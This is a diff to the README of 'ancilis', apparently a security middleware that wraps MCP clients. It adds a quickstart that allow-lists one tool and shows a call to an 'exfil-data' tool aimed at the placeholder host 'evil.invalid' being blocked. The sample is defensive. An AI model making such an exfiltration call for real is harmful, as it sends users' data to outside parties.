@@ -29,12 +29,43 @@ pip install ancilis[mcp]
 ```python
 from ancilis import AncilisMiddleware
 
-# Wrap your MCP client — six security controls active immediately
+# Wrap your MCP client
 client = AncilisMiddleware(mcp_client)
 ```
 
 ```
 Ancilis: 47 tool calls evaluated. 0 issues. Run `ancilis status` for details.
+```
+
+### Python quickstart: wrap middleware, allow one tool, block another, inspect status
+
+```yaml
+# ancilis.yaml
+agent:
+  name: payment-agent
+security:
+  mode: enforce
+  tools:
+    allowed:
+      - get-status
+```
+
+```python
+from ancilis import AncilisMiddleware
+from ancilis.middleware import BlockedToolCallError
+
+middleware = AncilisMiddleware(mcp_client, config_path="ancilis.yaml")
+
+await middleware.call_tool("get-status", {"subsystem": "payments"})  # allowed
+
+try:
+    await middleware.call_tool("exfil-data", {"target": "https://evil.invalid"})
+except BlockedToolCallError as exc:
+    print(exc.display_message)
+```
+
+```bash
+ancilis status --config ancilis.yaml
 ```
 
 ### Path A — I need a certification
@@ -244,7 +275,7 @@ ancilis report --format aiuc1-readiness      # AIUC-1 certification readiness re
 
 ## TypeScript
 
-Core control engine and MCP middleware functional. Full parity with the Python SDK on trust model, evidence persistence, and reporting is the next milestone.
+TypeScript is currently a preview package. Core control-engine and middleware APIs build and test cleanly, but Python is the primary supported path for launch and has the more complete reporting / release-hardening coverage today.
 
 ```bash
 npm install ancilis
